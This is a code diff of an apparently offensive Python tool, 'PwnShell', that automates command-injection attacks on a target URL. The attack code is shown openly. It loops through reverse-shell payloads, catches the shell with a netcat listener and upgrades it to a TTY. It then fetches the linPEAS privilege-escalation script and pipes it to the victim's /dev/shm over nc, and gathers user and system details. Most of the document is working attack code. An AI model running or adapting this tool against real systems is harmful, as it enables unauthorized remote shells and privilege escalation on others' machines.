@@ -12,6 +12,7 @@ import requests
 import http.server
 import socketserver
 import urllib.parse
+from payloads import PayLoads
 
 
 class PwnShell:
@@ -35,12 +36,12 @@ class PwnShell:
         ######################################################################
 
     def info(self):
-        print('[*]LOCAL IP ADDRESS : %s' % ip)
-        print('[*]LOCAL PORT : %s' % port)
-        print('[*]TARGET URL : %s' % domain)
-        if authentication:
-            print('[*]USERNAME : %s' % authentication[0])
-            print('[*]PASSWORD : %s' % authentication[1])
+        print('[*]LOCAL IP ADDRESS : %s' % self.ip)
+        print('[*]LOCAL PORT : %s' % self.port)
+        print('[*]TARGET URL : %s' % self.domain)
+        if self.authentication:
+            print('[*]USERNAME : %s' % self.authentication[0])
+            print('[*]PASSWORD : %s' % self.authentication[1])
         print('\n#Waiting for a Connection ....')
 
     def shell_linux(self):  # Default option
@@ -54,20 +55,22 @@ class PwnShell:
 
     def is_valid(self):  # Checking if the ip address is valid
         try:
-            ipaddress.ip_address(ip)
+            ipaddress.ip_address(self.ip)
             return True
         except ValueError:
-            print("\n[!]Invalid IP : " + ip)
+            print("\n[!]Invalid IP : " + self.ip)
             exit_gracefully()
 
-    def listener(self):
-        nc = nclib.Netcat(listen=('', port))
+    def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
+        nc = nclib.Netcat(listen=('', self.port), verbose=True)
+        print('\n[*]Upgrading Shell to TTY & Uploading PrivESC Scripts to -> [/dev/shm]')
         os.system(
             'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null')
         nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
-        nc.send_line(b'echo $SHELL')
-        send = f'''nc {ip} 9002 > /dev/shm/linpeas.sh'''
+        send = f'''nc {self.ip} 9002 > /dev/shm/linpeas.sh ; clear'''
         nc.send_line(send.encode("utf-8"))
+        nc.send_line(
+            b'''u=$(uname -a); w=$(whoami); s=$(echo $SHELL);clear ; echo -e "[+]Sysinfo : $u \n[+]Current User : $w\n[+]Current Shell : $s"''')
         nc.interact()
         nc.close()
 
@@ -91,18 +94,23 @@ class PwnShell:
         sendpayload.join()
 
     def send_payload(self):
-        if method == 'post':
-            self.req_post()
-        elif method == 'get':
+        payloads = PayLoads(self.ip, self.port).payloads()
+        if self.method == 'post':
+            for payload in payloads:
+                self.req_post(payload)
+                # Here we have to stop the loop after getting a shell in the second thread
+        elif self.method == 'get':
             print('get method')
-            self.req_get()
+            for payload in payloads:
+                self.req_get(payload)
         else:
             return False
 
-    def req_post(self):
-        payload = f'nc localhost 9001 -e /bin/bash'
-        encoded_payload = self.get_encoded_url(payload)
-        url = domain.replace('PWNME', encoded_payload)  # payoad will be the revshells
+    def req_post(self, payload):
+        # payload = f'nc localhost 9001 -e /bin/bash'
+        print(f'Trying: {payload}')
+        encoded_payload = self.get_url_encoded_payload(payload)
+        url = self.domain.replace('PWNME', encoded_payload)  # payoad will be the revshells
         proxies = {'http': 'http://127.0.0.1:8080'}
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -119,17 +127,18 @@ class PwnShell:
         r = requests.post(url, headers=headers, data=data_parsed,
                           cookies=cookies)
 
-    def req_get(self):
-        url = domain.replace('PWNME', '127.0.0.1')  # payload will be the revshells
+    def req_get(self, payload):
+        url = self.domain.replace('PWNME', '127.0.0.1')  # payload will be the revshells
         cookies = ''
         r = requests.get(url)
 
     def login(self):
         pass
 
-    def get_encoded_url(self, text):
-        encoded_text = urllib.parse.quote(text)
-        return encoded_text
+    @staticmethod
+    def get_url_encoded_payload(payload):
+        encoded_payload = urllib.parse.quote(payload)
+        return encoded_payload
 
 
 def exit_gracefully():
@@ -169,12 +178,6 @@ if __name__ == '__main__':
         args = parser.parse_args()
         ########################################################################
         ########################## Defining variables ##########################
-        ip = args.host
-        port = args.port
-        domain = args.url
-        method = args.method
-        data = args.data
-        authentication = args.auth
         pwnshell = PwnShell(args)
         pwnshell.send_payload()
     except KeyboardInterrupt:
